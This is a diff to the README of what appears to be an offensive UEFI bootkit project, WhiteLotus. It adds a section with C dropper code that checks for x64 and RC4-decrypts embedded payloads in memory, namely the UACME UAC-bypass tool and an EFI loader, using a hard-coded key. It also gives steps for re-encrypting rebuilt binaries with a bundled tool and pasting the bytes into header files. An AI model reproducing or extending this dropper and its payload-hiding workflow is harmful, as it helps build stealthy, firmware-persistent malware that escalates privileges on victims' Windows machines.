@@ -123,19 +123,46 @@ Handles UEFI-specific operations on a running Windows system:
 
 ---
 
-### Build Requirements
+### Modification 
 
-If you do need to recompile (e.g., changing logic, not just bytes):
+The project currently does not require any modifications, but if changes are necessary for certain situations, follow these steps. 
 
-- **WhiteLotusDXE**: EDK II development environment
-- **WhiteLotusEXE**: Visual Studio with Windows SDK (x64)
+The Dropper within the Executable project uses hard-coded bytes to load both UACME and LoaderEfi. However, these bytes are encrypted with RC4 and will be decrypted once the architecture is determined:
 
-### Testing Changes
+```c
+int main() {
+    WCHAR SzPayloadPath[MAX_PATH];
+    unsigned char Key[] = "S3cr3t_K3y_2026!";
+    int KeyLen = strlen((char*)Key);
 
-1. Make byte-level changes to source files
-2. Rebuild if logic changed (otherwise files can be used as-is)
-3. Test in a controlled environment with virtualization (recommended)
-4. Verify patches are applied correctly using a debugger or logging output
+    /* Determine the CPU Architecture */
+    SYSTEM_INFO SI;
+    GetNativeSystemInfo(&SI);
+    switch (SI.wProcessorArchitecture) {
+    case PROCESSOR_ARCHITECTURE_AMD64:
+        goto DropTheFile;
+    
+    /* Disable the other architectures */
+    default:
+        printf("[-] Unsupported architecture.\n");
+        return 1;
+    }
+
+DropTheFile:
+    /* Decrypt UACME in memory */
+    Rc4Crypt(payload_exe, payload_size, Key, KeyLen);
+
+    /* Decrypt the Loader in memory */
+    Rc4Crypt(LoadEfiPayload, LoadEfiPayloadSize, Key, KeyLen);
+```
+
+The same applies to the LoadEfi project: the .efi file within the project is defined using hard-coded bytes and is decrypted during the initialization phase of the LoadEfi project.  
+
+If you’ve made changes to the project and want to run it, here’s exactly what you need to do: If you’ve made changes to LoadEfi or Dropper, compile these projects, then use the EncryptTool tool included in the project to process the compiled LoadEfi or Dropper executable, retrieve the encrypted bytes, and replace them in the relevant header files. Since the projects will decrypt themselves automatically, simply adding the encrypted version will be sufficient. 
+
+You can also use this same tool for the WhiteLotus.efi file (this is not required, but if necessary in certain situations, you can access the .efi file from the Releases).
+
+---
 
 ## License
 
